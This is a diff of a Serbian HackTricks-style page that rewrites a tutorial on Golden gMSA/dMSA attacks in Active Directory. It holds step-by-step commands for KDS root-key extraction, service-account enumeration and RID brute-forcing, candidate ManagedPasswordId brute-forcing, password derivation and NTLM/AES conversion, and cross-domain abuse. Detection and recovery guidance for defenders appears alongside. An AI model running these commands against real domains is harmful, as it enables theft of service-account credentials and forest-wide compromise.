@@ -2,120 +2,114 @@
 
 {{#include ../../banners/hacktricks-training.md}}
 
-## Overview
+## Pregled
 
-Windows Managed Service Accounts (MSA) su posebni principals dizajnirani za pokretanje servisa bez potrebe za ručnim upravljanjem njihovim lozinkama.
-Postoje dve glavne varijante:
+Windows Managed Service Accounts su domenски entiteti namenjeni pokretanju servisa bez potrebe da administrator upravlja dugotrajnom lozinkom:
 
-1. **gMSA** – group Managed Service Account – može se koristiti na više hostova koji su autorizovani u njegovom atributu `msDS-GroupMSAMembership`.
-2. **dMSA** – delegated Managed Service Account – naslednik gMSA (u fazi preview), koji se oslanja na istu kriptografiju, ali omogućava granularnije scenarije delegiranja.
+1. **gMSA** (group Managed Service Account) mogu koristiti računari autorizovani putem `msDS-GroupMSAMembership` / `PrincipalsAllowedToRetrieveManagedPassword`.
+2. **dMSA** (delegated Managed Service Account) uveden je u **Windows Server 2025**. On vezuje normalnu autentikaciju za identitete autorizovanih računara i može zameniti legacy service account kroz migracioni workflow.
 
-Kod obe varijante, **lozinka nije sačuvana** na svakom Domain Controlleru (DC) kao standardni NT-hash. Umesto toga, svaki DC može da izvede trenutnu lozinku u hodu pomoću:
+Ne mešajte **Golden dMSA** sa **BadSuccessor**. Golden dMSA zahteva kompromitovanje KDS root-key materijala i izvodi ključeve managed account-a; [BadSuccessor](badsuccessor-dmsa-migration-abuse.md) umesto toga zloupotrebljava kontrolu nad dMSA objektom i njegovim atributima migracije.
 
-* šumski-specifičnog **KDS Root Key** (`KRBTGT\KDS`) – nasumično generisana tajna imenovana GUID-om, replikovana na svaki DC u okviru kontejnera `CN=Master Root Keys,CN=Group Key Distribution Service, CN=Services, CN=Configuration, …`.
-* SID-a ciljnog naloga.
-* per-account **ManagedPasswordID** (GUID), koji se nalazi u atributu `msDS-ManagedPasswordId`.
+DC ne čuva nezavisno generisanu clear-text lozinku za svaki gMSA. On izvodi lozinku naloga iz **KDS root key-a**, vremenski indeksiranog Group Key Distribution Protocol (GKDI) ključa i SID-a naloga. Root-key objekti su `msKds-ProvRootKey` objekti ispod `CN=Master Root Keys,CN=Group Key Distribution Service,CN=Services,CN=Configuration,...`; osetljiva vrednost je `msKds-RootKeyData`. `msDS-ManagedPasswordId` **nije GUID**: to je binarni identifikator ključa koji sadrži GUID KDS root key-a, GKDI `L0`/`L1`/`L2` indekse i metapodatke domena/šume. DC primenjuje KDF sa labelom `GMSA PASSWORD` i binarnim SID-om kao kontekstom, a zatim izlaže `MSDS-MANAGEDPASSWORD_BLOB` samo principalima autorizovanim za preuzimanje gMSA lozinke.<sup>[[2]](#references)</sup>
 
-Izvođenje je: `AES256_HMAC( KDSRootKey , SID || ManagedPasswordID )` → blob veličine 240 bajtova, koji se na kraju **base64-encoded** i čuva u atributu `msDS-ManagedPassword`.
-Tokom uobičajene upotrebe lozinke nije potreban Kerberos saobraćaj niti interakcija sa domenom – member host lokalno izvodi lozinku ako poseduje ova tri ulaza.
+dMSA se operativno obično razlikuje: njegova tajna treba da ostane na DC-u, a KDC izdaje credentials autorizovanom računaru. Međutim, dMSA ponovo koriste osnovnu KDS/GKDI derivaciju lozinke. Golden dMSA direktno rekonstruiše tu tajnu i time zaobilazi predviđeni machine-bound flow i Credential Guard na service host-u.<sup>[[1]](#references)</sup>
 
 ## Golden gMSA / Golden dMSA Attack
 
-Ako napadač može da pribavi sva tri ulaza **offline**, može da izračuna **važeće trenutne i buduće lozinke** za bilo koji gMSA/dMSA u šumi, bez ponovnog pristupa DC-u, čime zaobilazi:<sup>[[1]](#references)[[2]](#references)</sup>
+Nakon ekstrakcije KDS root key-a, attacker može izvesti lozinke za naloge povezane sa tim ključem bez čitanja `msDS-ManagedPassword`. Time se zaobilazi ACL za preuzimanje lozinke po nalogu i napad opstaje tokom uobičajenih rotacija managed lozinki dok je kompromitovani root key i dalje u upotrebi. Kod gMSA, čitljivi `msDS-ManagedPasswordId` obično obezbeđuje tačan identifikator ključa. Kod ACL-om ograničenih dMSA, Golden dMSA smanjuje nedostajući identifikator na samo **1.024 kandidata**.<sup>[[1]](#references)[[2]](#references)</sup>
 
-* LDAP read auditing
-* intervale promene lozinke (može ih unapred izračunati)
+### Preduslovi
 
-Ovo je analogno *Golden Ticket* napadu na service accounts.<sup>[[1]](#references)[[2]](#references)</sup>
+* Relevantni KDS root-key objekat, koji se obično dobija sa Enterprise Admin / forest-root Domain Admin pravima, kao `SYSTEM` na DC-u ili iz izložene DC baze podataka ili backup-a.<sup>[[1]](#references)[[2]](#references)</sup>
+* SID ciljnog naloga, DNS domen, naziv šume i `sAMAccountName`.<sup>[[1]](#references)[[2]](#references)</sup>
+* Za direktan gMSA proračun, njegov base64-encoded `msDS-ManagedPasswordId`; za Golden dMSA ovo se umesto toga može pogoditi.<sup>[[1]](#references)[[2]](#references)</sup>
+* x64 Windows host sa .NET Framework 4.7.2 za [`GoldenDMSA`](https://github.com/Semperis/GoldenDMSA).<sup>[[3]](#references)</sup>
 
-### Prerequisites
+### Faza 1 - Ekstrakcija KDS root key-a
 
-1. **Forest-level compromise** jednog DC-a (ili Enterprise Admin), odnosno `SYSTEM` pristup jednom od DC-ova u šumi.
-2. Mogućnost enumeracije service accounts (LDAP read / RID brute-force).
-3. .NET ≥ 4.7.2 x64 workstation za pokretanje [`GoldenDMSA`](https://github.com/Semperis/GoldenDMSA) ili ekvivalentnog koda.<sup>[[3]](#references)</sup>
-
-### Golden gMSA / dMSA
-#### Phase 1 – Extract the KDS Root Key
-
-Dump sa bilo kog DC-a (Volume Shadow Copy / raw SAM+SECURITY hives ili remote secrets):<sup>[[1]](#references)[[2]](#references)</sup>
+`GoldenDMSA` i [`GoldenGMSA`](https://github.com/Semperis/GoldenGMSA) izvoze polja root-key objekta kao base64 blob. Bez argumenta domena, alati upituju forest root i zahtevaju odgovarajući privilegovani directory access. Sa argumentom domena/šume, `SYSTEM` na DC-u može upitati lokalnu repliku Configuration naming-context-a tog DC-a.<sup>[[1]](#references)[[2]](#references)</sup>
 ```cmd
-reg save HKLM\SECURITY security.hive
-reg save HKLM\SYSTEM  system.hive
-
-# With mimikatz on the DC / offline
-mimikatz # lsadump::secrets
-mimikatz # lsadump::trust /patch   # shows KDS root keys too
-
-# With GoldendMSA
-GoldendMSA.exe kds --domain <domain name>   # query KDS root keys from a DC in the forest
+:: GoldenDMSA: Enterprise Admin, or SYSTEM on a DC with --domain
 GoldendMSA.exe kds
+GoldendMSA.exe kds -g KDS_ROOT_KEY_GUID
+GoldendMSA.exe kds --domain child.example.local
 
-# With GoldenGMSA
+:: GoldenGMSA equivalents
 GoldenGMSA.exe kdsinfo
+GoldenGMSA.exe kdsinfo --guid KDS_ROOT_KEY_GUID
 ```
-Base64 string označen kao `RootKey` (GUID naziv) potreban je u kasnijim koracima.<sup>[[1]](#references)[[2]](#references)</sup>
+Zabeležite i GUID root-key ključa i base64 blob root-key ključa. Izvoz registra `SECURITY`/`SYSTEM` hive sam po sebi nije KDS root key: merodavni materijal nalazi se u AD Configuration particiji.<sup>[[1]](#references)[[2]](#references)</sup>
 
-##### Faza 2 – Enumerisanje gMSA / dMSA objekata
+### Faza 2 - Enumeracija gMSA / dMSA objekata
 
-Preuzmite najmanje `sAMAccountName`, `objectSid` i `msDS-ManagedPasswordId`:<sup>[[1]](#references)[[2]](#references)</sup>
-```bash
-# Authenticated or anonymous depending on ACLs
-Get-ADServiceAccount -Filter * -Properties msDS-ManagedPasswordId | \
-Select sAMAccountName,objectSid,msDS-ManagedPasswordId
+Za gMSA objekte pribavite `sAMAccountName`, `objectSid` i binarni `msDS-ManagedPasswordId`. Ovo poslednje je obično čitljivo čak i kada caller nema dozvolu za preuzimanje atributa `msDS-ManagedPassword`.<sup>[[2]](#references)</sup>
+```powershell
+Get-ADServiceAccount -Filter * -Properties objectSid,msDS-ManagedPasswordId |
+Select-Object sAMAccountName,objectSid,msDS-ManagedPasswordId
 
-GoldenGMSA.exe gmsainfo
+GoldenGMSA.exe gmsainfo --domain example.local
 ```
-[`GoldenDMSA`](https://github.com/Semperis/GoldenDMSA) implementira pomoćne režime:<sup>[[1]](#references)[[3]](#references)</sup>
-```bash
-# LDAP enumeration (kerberos / simple bind)
+Podrazumevani ACL za dMSA može sprečiti LDAP enumeration sa niskim privilegijama. `GoldenDMSA info` može upitati LDAP ili enumerisati kandidate RID-ova i razrešiti SID-ove preko `LsaLookupSids` kroz `\PIPE\lsarpc`, a zatim razlikovati dMSA-ove od računa računara i gMSA-ova.<sup>[[1]](#references)[[3]](#references)</sup>
+```cmd
 GoldendMSA.exe info -d example.local -m ldap
-
-# RID brute force if anonymous binds are blocked
-GoldendMSA.exe info -d example.local -m brute -r 5000 -u jdoe -p P@ssw0rd
+GoldendMSA.exe info -d example.local -m brute -u alice -p PASSWORD -o EXAMPLE -r 5000
 ```
-##### Faza 3 – Guess / Discover ManagedPasswordID (kada nedostaje)
+### Faza 3 - Rekonstruiši ili pogodi `msDS-ManagedPasswordId`
 
-Neke implementacije *uklanjaju* `msDS-ManagedPasswordId` iz čitanja zaštićenih ACL-om.
-Pošto je GUID veličine 128 bita, naivni bruteforce nije izvodljiv, ali:
+Identifikator ključa uključuje `L0Index`, `L1Index` i `L2Index`, a ne vremensku oznaku kreiranja naloga praćenu nasumičnim bitovima. Semperis je otkrio da putanja generisanja lozinke ne koristi kandidat `L0Index`, dok su `L1Index` i `L2Index` ograničeni na vrednosti `0..31`. Shodno tome, napadač koji zna GUID root-key-a, domen, forest i SID može da konstruiše svih `32 * 32 = 1,024` kandidatskih identifikatora.<sup>[[1]](#references)</sup>
+```cmd
+:: Write 1,024 base64 ManagedPasswordId candidates to KDS_ROOT_KEY_GUID.txt
+GoldendMSA.exe wordlist -s DMSA_SID -d example.local -f example.local -k KDS_ROOT_KEY_GUID
 
-1. Prvih **32 bita = Unix epoch vreme** kreiranja naloga (preciznost u minutima).
-2. Nakon toga sledi 96 nasumičnih bitova.
-
-Zato je **uzak wordlist po nalogu** (± nekoliko sati) realan.
-```bash
-GoldendMSA.exe wordlist -s <SID> -d example.local -f example.local -k <KDSKeyGUID>
+:: Derive and validate candidates; -t caches the successful TGT
+GoldendMSA.exe bruteforce -s DMSA_SID -i KDS_ROOT_KEY_GUID -k KDS_ROOT_KEY_BASE64 -d example.local -u svc_dmsa$ -t
 ```
-Alat izračunava kandidate za lozinku i upoređuje njihov base64 blob sa stvarnim atributom `msDS-ManagedPassword` – podudaranje otkriva ispravan GUID.
+Izračunavanja se obavljaju offline, ali identifikovanje aktivnog kandidata obično zahteva pokušaje autentikacije. To može proizvesti nalet neuspelih Kerberos pre-authentication ili NTLM validation pokušaja pre nego što se pronađe validan ključ. Za AES Kerberos ključeve, salt managed naloga koji alat koristi jeste `UPPERCASE.DNS.DOMAIN` + `host` + account UPN pisan malim slovima, bez završnog `$` (na primer, `EXAMPLE.LOCALhostsvc_dmsa.example.local`).<sup>[[1]](#references)</sup>
 
-##### Faza 4 – Offline izračunavanje i konverzija lozinke
+### Faza 4 - Izračunavanje i korišćenje password-a
 
-Kada je ManagedPasswordID poznat, validna lozinka je udaljena jednu komandu:<sup>[[1]](#references)[[2]](#references)</sup>
-```bash
-# derive base64 password
-GoldendMSA.exe compute -s <SID> -k <KDSRootKey> -d example.local -m <ManagedPasswordID> -i <KDSRootKey ID>
-GoldenGMSA.exe compute --sid <SID> --kdskey <KDSRootKey> --pwdid <ManagedPasswordID>
+Ako je tačan identifier poznat, izračunajte 256-byte password buffer i konvertujte ga u NTLM/AES materijal. Base64 vrednost koju ovi alati prikazuju jeste enkodovani password buffer, **a ne sam LDAP `MSDS-MANAGEDPASSWORD_BLOB`**.<sup>[[2]](#references)[[3]](#references)</sup>
+```cmd
+GoldendMSA.exe compute -s ACCOUNT_SID -k KDS_ROOT_KEY_BASE64 -d example.local -m MANAGED_PASSWORD_ID_BASE64
+GoldendMSA.exe convert -d example.local -u svc_account$ -p BASE64_PASSWORD
+
+GoldenGMSA.exe compute --sid ACCOUNT_SID --kdskey KDS_ROOT_KEY_BASE64 --pwdid MANAGED_PASSWORD_ID_BASE64
 ```
-Dobijeni hash-evi mogu biti injektovani pomoću **mimikatz** (`sekurlsa::pth`) ili alata **Rubeus** za Kerberos abuse, čime se omogućavaju stealth **lateral movement** i **persistence**.
+NTLM rezultat može da se koristi tamo gde je NTLM prihvaćen; AES ključ može da se koristi za overpass-the-hash / TGT zahteve tamo gde je managed nalog ograničen samo na AES. Ovo daje privilegije, SPN-ove, konfiguraciju delegiranja i pristup resursima kompromitovanog managed service naloga, bez dodavanja mašine napadača u `PrincipalsAllowedToRetrieveManagedPassword`.<sup>[[1]](#references)[[2]](#references)</sup>
 
-## Detekcija i mitigacija
+### Zloupotreba Configuration particije između domena
 
-* Ograničite mogućnosti **DC backup and registry hive read** na Tier-0 administratore.
-* Pratite kreiranje **Directory Services Restore Mode (DSRM)** ili **Volume Shadow Copy** na DC-ovima.
-* Auditujte čitanja / izmene `CN=Master Root Keys,…` i `userAccountControl` flag-ova servisnih naloga.
-* Detektujte neuobičajene **base64 password writes** ili iznenadnu ponovnu upotrebu lozinki servisa na hostovima.
-* Razmotrite konvertovanje gMSA naloga sa visokim privilegijama u **classic service accounts** sa redovnim nasumičnim rotacijama tamo gde Tier-0 izolacija nije moguća.
+Objekti KDS root ključeva nalaze se u forest Configuration naming context-u, koji se replicira na DC-ove u child domenima. Shodno tome, `SYSTEM` na DC-u child domena može da pročita KDS materijal root-a šume iz lokalne replike child DC-a, iako child Domain Admins ne mogu direktno da pročitaju objekat sa DC-a root domena šume. Ako napadač može da pročita i `msDS-ManagedPasswordId` parent-domain gMSA naloga, GoldenGMSA može da izračuna lozinku tog parent naloga; SID filtering ne sprečava ovaj kriptografski napad.<sup>[[5]](#references)</sup>
+```cmd
+:: Run as SYSTEM on a child.example.local DC
+GoldenGMSA.exe kdsinfo --forest child.example.local
+
+:: Query target metadata in the parent, then combine both inputs
+GoldenGMSA.exe gmsainfo --domain example.local
+GoldenGMSA.exe compute --sid PARENT_GMSA_SID --domain example.local --forest child.example.local
+```
+## Detekcija, ograničavanje i oporavak
+
+* Konfigurišite SACL na kontejneru **Master Root Keys**, koji se nasleđuje na objekte `msKds-ProvRootKey`, za uspešna čitanja atributa `msKds-RootKeyData`. Kada je omogućeno Directory Service Access auditing, online extraction proizvodi Security događaj **4662**; istražite subjekte koji nisu očekivani DC-ovi ili Tier-0 operatori. Takođe auditujte izmene ovih SACL-ova i ACL-ova objekata root-key.<sup>[[1]](#references)[[2]](#references)[[4]](#references)</sup>
+* Child-to-parent attack čita KDS objekat iz lokalne replike kompromitovanog child DC-a, tako da forest-root domain možda neće registrovati to čitanje. U parent domain-u auditujte uspešna čitanja atributa `msDS-ManagedPasswordId` (schema GUID `0e78295a-c6d3-0a40-b491-d62251ffa0a6`) na objektima `msDS-GroupManagedServiceAccount` i istražite čitanja od strane principal-a iz drugog domain-a.<sup>[[5]](#references)</sup>
+* Korelišite pristup KDS objektima sa neuobičajenim logon-ima managed account-a i naletima Kerberos/NTLM grešaka za service account-e sa sufiksom `$`. Offline computation nakon prethodne krađe baze podataka ili backup-a nije vidljiv aktivnom DC-u.<sup>[[1]](#references)[[3]](#references)</sup>
+* Uobičajena rotacija password-a nije dovoljna nakon izlaganja root-key-a. Microsoft-ova aktuelna procedura oporavka kreira novi KDS root key, restartuje KDS na svim relevantnim DC-ovima i premešta pogođene account-e na taj key. Ako su obim ili vreme izlaganja nepoznati, a čekanje na bezbednu rotaciju nije prihvatljivo, zamenite svaki gMSA koji je koristio kompromitovani key; ako je obim poznat, Microsoft dokumentuje authoritative-restore workflow za prinudnu bezbednu rotaciju. Potvrdite novi key GUID u `msDS-ManagedPasswordId` pre brisanja starog key-a.<sup>[[4]](#references)</sup>
+* Tretirajte pristup DC bazi podataka i backup-u, replikaciju Configuration-partition-a i administraciju KDS root-key-a kao Tier-0. Smanjenje vrednosti `ManagedPasswordIntervalInDays` ograničava neke recovery prozore, ali ne opoziva već kompromitovani root key.<sup>[[4]](#references)</sup>
 
 ## Alati
 
-* [`Semperis/GoldenDMSA`](https://github.com/Semperis/GoldenDMSA) – referentna implementacija korišćena na ovoj stranici.<sup>[[3]](#references)</sup>
-* [`Semperis/GoldenGMSA`](https://github.com/Semperis/GoldenGMSA/) – referentna implementacija korišćena na ovoj stranici.
-* [`mimikatz`](https://github.com/gentilkiwi/mimikatz) – `lsadump::secrets`, `sekurlsa::pth`, `kerberos::ptt`.
-* [`Rubeus`](https://github.com/GhostPack/Rubeus) – pass-the-ticket korišćenjem izvedenih AES ključeva.
+* [`Semperis/GoldenDMSA`](https://github.com/Semperis/GoldenDMSA) - dMSA/gMSA enumeration, generisanje identifikatora, validacija 1.024 kandidata, password computation i NTLM/AES conversion.<sup>[[3]](#references)</sup>
+* [`Semperis/GoldenGMSA`](https://github.com/Semperis/GoldenGMSA/) - gMSA/KDS enumeration i online, offline i cross-domain password computation.<sup>[[2]](#references)</sup>
+* [`Rubeus`](https://github.com/GhostPack/Rubeus) i [`Impacket`](https://github.com/fortra/impacket) - koristite ili validirajte izvedene NTLM/AES key-eve u ovlašćenom testiranju.
 
-## Reference
 
-- [1] [Golden dMSA – authentication bypass for delegated Managed Service Accounts](https://www.semperis.com/blog/golden-dmsa-what-is-dmsa-authentication-bypass/)
-- [2] [gMSA Active Directory Attacks Accounts](https://www.semperis.com/blog/golden-gmsa-attack/)
-- [3] [Semperis/GoldenDMSA GitHub repository](https://github.com/Semperis/GoldenDMSA)
 
+## References
+
+- [1] [Golden dMSA - zaobilaženje autentikacije za delegirane Managed Service Accounts](https://www.semperis.com/blog/golden-dmsa-what-is-dmsa-authentication-bypass/)
+- [2] [gMSA Active Directory napadi](https://www.semperis.com/blog/golden-gmsa-attack/)
+- [3] [Semperis/GoldenDMSA GitHub repozitorijum](https://github.com/Semperis/GoldenDMSA)
+- [4] [Microsoft - Kako se oporaviti od Golden gMSA napada](https://learn.microsoft.com/en-us/troubleshoot/windows-server/windows-security/recover-from-golden-gmsa-attack)
+- [5] [SID filter kao bezbednosna granica između domain-a? Deo 5 - Golden gMSA trust attack](https://itm8.com/articles/sid-filter-as-security-boundary-between-domains-part-5)
 {{#include ../../banners/hacktricks-training.md}}
